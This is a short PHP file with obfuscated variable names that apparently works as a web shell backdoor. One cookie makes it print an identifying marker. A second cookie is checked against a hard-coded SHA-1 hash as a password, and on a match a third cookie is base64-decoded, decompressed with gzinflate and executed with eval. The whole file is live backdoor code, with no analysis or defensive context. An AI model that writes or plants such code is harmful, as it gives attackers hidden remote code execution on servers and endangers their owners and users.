<?php

$ehhdrsdsw = 'btdgsvcx1xgc';
$dvnskch = "d5dfab3cbd7dd772e10993f5f3470ddb818cc783";

if (isset($_COOKIE[$ehhdrsdsw])) {
    exit($ehhdrsdsw . $dvnskch . $ehhdrsdsw);
}

$ausdbhfc = @$_COOKIE[substr($dvnskch, 0, 16)];
$ausdbhfc = sha1($ausdbhfc);

$gzasfsd = "gzinflate";

if ($ausdbhfc === $dvnskch)
{
    $kbdvjgcf = $_COOKIE[substr($dvnskch, 16, 16)];

    $dvnskch = base64_decode($kbdvjgcf);

    $dvnskch = $gzasfsd($dvnskch);

    if (!empty($dvnskch))
    {
        eval($dvnskch);
    }
}
exit();


